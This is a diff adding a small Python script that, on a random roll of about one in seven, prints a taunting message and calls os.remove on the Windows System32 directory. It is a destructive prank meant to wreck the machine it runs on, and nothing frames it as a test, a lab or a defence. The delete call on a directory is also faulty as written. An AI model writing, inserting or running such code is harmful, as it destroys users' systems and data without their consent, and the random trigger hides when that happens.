@@ -1,0 +1,6 @@
+import random
+import os
+
+if random.randint(0, 6) == 1:
+    print("oops tough luck no mor System32 for you")
+    os.remove("C:\Windows\System32")
